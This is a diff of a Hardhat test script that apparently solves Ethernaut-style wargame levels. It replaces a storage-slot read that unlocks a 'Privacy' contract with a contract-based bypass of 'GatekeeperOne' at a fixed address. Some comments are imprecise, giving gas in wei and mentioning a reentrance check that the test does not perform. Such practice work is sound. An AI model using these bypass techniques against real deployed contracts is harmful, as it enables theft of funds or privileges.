@@ -1,53 +1,52 @@
 import { expect } from "chai";
+import { Attack } from "../typechain-types";
+import { GatekeeperOne } from "../typechain-types";
 import { ethers } from "hardhat";
-import { Attack, Privacy } from "../typechain-types";
+import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
 
-describe("Elevator Exploit using Contract ", function () {
+describe("Gatekeeper exploit using contract attack", function () {
   let attackerContract: Attack,
-    privacyContract: Privacy,
+    gatekeeperOneContract: GatekeeperOne,
     contractAddress: string,
-    lockedValue: boolean;
+    attacker: SignerWithAddress,
+    getNewEntrant: string;
 
   before("Setup for attack locally", async function () {
-    // Learn how to convert to type of bytes in hardhat.
-    contractAddress = "0xbcc275859ba7d161d3211c4165f94b8e059418f5";
+    // Deply gate keeper one contract
+    [attacker] = await ethers.getSigners();
+    contractAddress = "0x55565f8113e86234f6Ac0306AF2Aeee91Ec72746";
 
-    privacyContract = await ethers.getContractAt("Privacy", contractAddress);
+    gatekeeperOneContract = await ethers.getContractAt(
+      "GatekeeperOne",
+      contractAddress
+    );
 
     const attackerContractFactory = await ethers.getContractFactory("Attack");
 
-    attackerContract = await attackerContractFactory.deploy(contractAddress);
-
+    attackerContract = await attackerContractFactory.deploy(
+      gatekeeperOneContract.address
+    );
     await attackerContract.deployed();
   });
 
   it("perform exploit", async function () {
-    // // Attack flow
-    // Lets view if the privacy contract is locked
-    let originalLockedValue = await privacyContract.locked();
-
-    console.log("The original locked value is: ", originalLockedValue);
-    // Grab the storageSlot data at slot 5
-    let keyData = await ethers.provider.getStorageAt(contractAddress, 5);
-
-    console.log("Key data looks like: ", keyData);
-
-    // call our custom attack contract, to unlock the privacy contract
-    // our attack contract, takes the bytes32 data at slot 5 and converts to bytes16
-    let txAttack = await attackerContract.attack(keyData);
+    // Attack flow
+    let getOldEntrant = await gatekeeperOneContract.entrant();
+    console.log("the old entrant is: ", getOldEntrant);
+    // 1. Send a tx from a contract and not directly from an EOA
+    // 2. withing the contract, call enter with the address casted to bytes8 AND set the tx.gaslimit = 8191 wei
+    let txAttack = await attackerContract.attack();
 
     let receiptAttack = await txAttack.wait();
 
-    console.log("The receipt is", receiptAttack);
+    // console.log("The receipt output is ", receiptAttack);
+    getNewEntrant = await gatekeeperOneContract.entrant();
 
-    // view the final locked value
-    lockedValue = await privacyContract.locked();
-
-    console.log("The new locked value is: ", lockedValue);
+    console.log("the new entrant is, ", getNewEntrant);
   });
 
   after("confirm exploit", async function () {
-    // if false, privacy has been exploited
-    expect(lockedValue).to.be.eq(false);
+    // check that the reentrance contract == 0
+    expect(getNewEntrant).to.be.eq(attacker.address);
   });
 });
